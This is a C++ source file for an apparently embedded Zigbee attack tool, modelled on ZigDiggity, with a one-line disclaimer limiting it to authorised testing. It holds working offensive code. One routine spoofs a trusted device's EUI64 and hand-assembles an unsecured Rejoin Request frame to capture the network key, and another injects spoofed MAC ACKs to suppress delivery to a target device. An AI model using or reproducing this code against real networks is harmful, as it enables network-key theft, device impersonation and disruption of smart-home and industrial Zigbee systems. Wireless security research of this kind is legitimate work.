/*
 * ZbAttack.cpp — offensive Zigbee probes (ZigDiggity-style)
 *
 * FOR AUTHORISED SECURITY TESTING OF YOUR OWN NETWORK ONLY.
 */

#include "ZbAttack.h"

extern uint8_t Verbose;

ZbAttack::ZbAttack(IEEE802154Sniffer &sniffer)
    : _sniffer(sniffer), _nwkSeq(0)
{}

// -- insecure_rejoin -----------------------------------------------------------

bool ZbAttack::insecureRejoin(uint16_t targetShortAddr) {
    HostRecord *h = _sniffer.findHost(targetShortAddr);
    if (!h) {
        Serial.printf("[ATTACK] insecure_rejoin: unknown host 0x%04X - use 'l' to list\n",
                      targetShortAddr);
        return false;
    }
    if (h->extAddr == 0) {
        Serial.printf("[ATTACK] insecure_rejoin: no captured EUI64 for 0x%04X - "
                      "need to sniff a frame carrying its extended address first\n",
                      targetShortAddr);
        return false;
    }
    uint16_t pan = h->panId;
    if (pan == 0 || pan == 0xFFFF) {
        Serial.printf("[ATTACK] insecure_rejoin: unknown PAN for 0x%04X\n", targetShortAddr);
        return false;
    }

    Serial.println("[ATTACK] ===== insecure_rejoin =====");
    Serial.printf("[ATTACK] Impersonating 0x%04X (EUI64 %016llX) on PAN 0x%04X\n",
                  targetShortAddr, h->extAddr, pan);

    // Spoof the target's EUI64 for the duration: the coordinator must see the
    // rejoin as coming from a device it already trusts, and any resulting
    // Transport Key is addressed to that EUI64 (ZbKeyCapture matches on it).
    _sniffer.setOwnEUI64(h->extAddr);

    bool ok = _sendRejoinRequest(0x0000, pan, h->extAddr);
    if (!ok) {
        Serial.println("[ATTACK] insecure_rejoin: TX failed");
        return false;
    }

    Serial.println("[ATTACK] Unsecured Rejoin Request sent to coordinator 0x0000.");
    Serial.println("[ATTACK] If the Trust Center permits insecure rejoin, watch for a");
    Serial.println("[ATTACK] Rejoin Response + '*** Network key captured! ***' shortly.");
    Serial.println("[ATTACK] EUI64 is still SPOOFED - run 'M' (no arg) to restore hardware MAC.");
    return true;
}

// Build+send an unsecured NWK Rejoin Request wrapped in a MAC data frame.
//   MAC:  FC(2) seq(1) dstPAN(2) dstShort(2) srcEUI64(8)     [PAN-ID compressed]
//   NWK:  FC(2) dst(2) src(2) radius(1) seq(1) srcIEEE(8)
//         payload: cmd(1)=RejoinRequest, capability(1)
// No NWK security header — that is exactly what makes it the *insecure* rejoin.
bool ZbAttack::_sendRejoinRequest(uint16_t coordShort, uint16_t pan,
                                   uint64_t spoofEui64) {
    static uint8_t macSeq = 0;
    uint8_t frame[SNIFFER_MAX_FRAME_LEN];
    uint8_t off = 0;

    // MAC header: data frame, ACK requested, PAN-ID compression, dst=short, src=extended.
    frame[off++] = 0x61;  // type=Data(001), AR=1(<<5), PAN ID compression=1(<<6)
    frame[off++] = 0xC8;  // dst addr mode=short(2<<2), src addr mode=extended(3<<6)
    frame[off++] = macSeq++;
    frame[off++] = (uint8_t)(pan & 0xFF);
    frame[off++] = (uint8_t)(pan >> 8);
    frame[off++] = (uint8_t)(coordShort & 0xFF);
    frame[off++] = (uint8_t)(coordShort >> 8);
    for (int i = 0; i < 8; i++) frame[off++] = (uint8_t)(spoofEui64 >> (8 * i));

    // NWK header: command frame, protocol version 2, security OFF, source IEEE present.
    uint16_t nwkFc = 0x0009 | ZB_NWK_FC_EXT_SRC;  // type=cmd | protoVer2 | srcIEEE
    frame[off++] = (uint8_t)(nwkFc & 0xFF);
    frame[off++] = (uint8_t)(nwkFc >> 8);
    frame[off++] = (uint8_t)(coordShort & 0xFF);  // NWK dst = coordinator
    frame[off++] = (uint8_t)(coordShort >> 8);
    frame[off++] = 0xFF;                            // NWK src = 0xFFFF (no short addr yet)
    frame[off++] = 0xFF;
    frame[off++] = 1;                               // radius (direct to parent)
    frame[off++] = _nwkSeq++;
    for (int i = 0; i < 8; i++) frame[off++] = (uint8_t)(spoofEui64 >> (8 * i));  // src IEEE

    // NWK payload: Rejoin Request + MAC capability (alloc address, RFD/simple).
    frame[off++] = ZB_NWK_CMD_REJOIN_REQUEST;
    frame[off++] = ASSOC_CAP_ALLOC_ADDR;

    if (Verbose) {
        Serial.printf("[ATTACK] rejoin frame (%u B): ", off);
        for (uint8_t i = 0; i < off; i++) Serial.printf("%02X ", frame[i]);
        Serial.println();
    }

    return _sniffer.sendRawFrame(frame, off);
}

// -- ack_attack (wrappers) -----------------------------------------------------

void ZbAttack::ackAttack(uint16_t targetShortAddr) {
    Serial.println("[ATTACK] ===== ack_attack =====");
    Serial.printf("[ATTACK] Racing/suppressing delivery to 0x%04X by spoofing its MAC ACKs.\n",
                  targetShortAddr);
    _sniffer.startAckAttack(targetShortAddr);
}

void ZbAttack::stopAckAttack() {
    _sniffer.stopAckAttack();
}

void ZbAttack::printAckAttackStatus() const {
    if (_sniffer.isAckAttackActive())
        Serial.printf("[ATTACK] ack_attack ACTIVE against 0x%04X — %lu ACKs injected\n",
                      _sniffer.getAckAttackTarget(),
                      (unsigned long)_sniffer.getAckAttackCount());
    else
        Serial.println("[ATTACK] ack_attack idle");
}
